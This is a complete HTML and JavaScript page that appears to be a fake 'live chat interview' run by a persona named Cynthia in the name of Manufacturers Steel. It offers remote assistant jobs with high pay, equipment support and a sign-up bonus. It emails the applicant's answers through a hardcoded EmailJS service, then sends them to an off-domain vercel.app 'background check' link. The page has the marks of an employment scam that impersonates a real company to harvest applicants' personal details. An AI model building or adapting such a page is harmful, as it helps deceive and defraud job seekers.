<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Manufacturers Steel Interview</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body{
  margin:0;
  background:#f1f2f4;
  font-family:Arial,Helvetica,sans-serif;
}
.container{
  max-width:700px;
  margin:40px auto;
  background:white;
  padding:40px;
  border-radius:10px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
}
.logo{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  margin-bottom:20px;
}
.question{
  font-size:20px;
  margin-bottom:20px;
  line-height:1.5;
}
input, select{
  width:100%;
  padding:14px;
  font-size:16px;
  border:1px solid #ddd;
  border-radius:6px;
  margin-bottom:10px;
  background:white;
}
.error{
  font-size:14px;
  color:#dc2626;
  margin-bottom:15px;
  display:none;
}
button{
  background:#ff6a00;
  color:white;
  border:none;
  padding:14px 30px;
  font-size:18px;
  border-radius:30px;
  cursor:pointer;
}
button:hover{ opacity:.9; }
.progress{
  font-size:14px;
  color:#666;
  margin-bottom:20px;
  text-align:right;
}
</style>
</head>

<body>
<div class="container">
  <div class="logo">MANUFACTURERS STEEL</div>
  <div class="progress" id="progress"></div>
  <div class="question" id="questionText"></div>

  <!-- Dynamic Input Area -->
  <div id="inputArea"></div>

  <div class="error" id="errorText">Please select a position to continue.</div>
  <button onclick="nextQuestion()">Next</button>
</div>

<script>
emailjs.init("3PXsfITe9J9_Y5Jxj");

// First question
const firstQuestion = `Hi, I‚Äôm Cynthia, and I‚Äôll be conducting your live chat interview today.

Before we begin.

Company Overview:
Manufacturers Steel Company is a family-owned steel service center based in Springville, California. Established in 1951, we are known for quality steel products, competitive pricing, and dependable customer service. We serve clients nationwide, supporting fabricators, OEMs, job shops, and contractors.

Role Overview:
This position combines administrative support and billing-related responsibilities, including recordkeeping, invoicing, payment tracking, customer communication, and task follow-ups. Overtime opportunities may be available when required.

Benefits Include:
‚Ä¢ Paid remote training
‚Ä¢ Flexible scheduling
‚Ä¢ Equipment support (if applicable)
‚Ä¢ Sign-up/Welcome Bonus of $500‚Äì$750 upon successful completion of training

Training is fully remote and designed to help you quickly become comfortable with our systems.

Please note: You must be located in the U.S. and legally authorized to work.

Please confirm the position you‚Äôre applying for to continue.`;

// Questions
const adminQuestions = [
  "Can you confirm where you are currently located?",
  "Regarding compensation, this position pays between $30 and $35 per hour, depending on experience and availability. Does this pay range work for you?",
  "What type of schedule are you seeking ‚Äî full-time, part-time, or flexible?",
  "Tell us a little about yourself and your professional background.",
  "What interested you in this role with MANUFACTURERS STEEL?"
];

const paQuestions = [
  "Can you confirm where you are currently located?",
  "Regarding compensation, this position pays between $30 and $35 per hour, depending on experience and availability. Does this pay range work for you?",
  "What type of schedule are you seeking ‚Äî full-time, part-time, or flexible?",
  "Tell us a little about yourself and your professional background.",
  "Why are you interested in this Personal Assistant role?"
];

let current = 0;
let answers = [];
let selectedQuestions = [];

const qText = document.getElementById("questionText");
const progress = document.getElementById("progress");
const inputArea = document.getElementById("inputArea");
const errorText = document.getElementById("errorText");

function showQuestion(){
  errorText.style.display = "none";

  if(current === 0){
    qText.innerText = firstQuestion;
    progress.innerText = "Question 1 of ?";
    inputArea.innerHTML = `
      <select id="answerInput">
        <option value="">-- Please select a position --</option>
        <option value="Remote Administrative & Billing Assistant">
          Remote Administrative & Billing Assistant
        </option>
        <option value="Remote Personal Assistant">
          Remote Personal Assistant
        </option>
      </select>
    `;
  } else {
    qText.innerText = selectedQuestions[current - 1];
    progress.innerText = "Question " + (current + 1) + " of " + (selectedQuestions.length + 1);
    inputArea.innerHTML = `<input id="answerInput" />`;
  }

  document.getElementById("answerInput").focus();
}

function nextQuestion(){
  const input = document.getElementById("answerInput");
  const answer = input.value;

  if(!answer){
    errorText.style.display = "block";
    return;
  }

  answers.push(answer);

  if(current === 0){
    selectedQuestions = (answer === "Remote Personal Assistant")
      ? paQuestions
      : adminQuestions;
  }

  current++;

  if(current < selectedQuestions.length + 1){
    showQuestion();
  } else {
    submitInterview();
  }
}

function submitInterview(){
  document.querySelector(".container").innerHTML = "<h2>Submitting your interview...</h2>";

  let message = "Position Applied For: " + answers[0] + "\n\n";
  for(let i = 1; i < answers.length; i++){
    message += selectedQuestions[i - 1] + "\nAnswer: " + answers[i] + "\n\n";
  }

  emailjs.send(
    "service_cwzrlga",
    "template_lgzkb7s",
    { interview_answers: message }
  ).then(()=>{
    document.querySelector(".container").innerHTML = `
      <h2>‚úÖ Interview Submitted</h2>
      <p>Thank you for completing the interview.</p>
      <p>Please complete the background check:</p>
      <p>
        üëâ <a href="https://manufacturerssteel-verification.vercel.app" target="_blank">
        https://manufacturerssteel-verification.vercel.app
        </a>
      </p>
    `;
  }).catch(()=>{
    document.querySelector(".container").innerHTML = `
      <h2>‚ö†Ô∏è Submission Failed</h2>
      <p>Please try again later.</p>
    `;
  });
}

showQuestion();
</script>
</body>
</html>
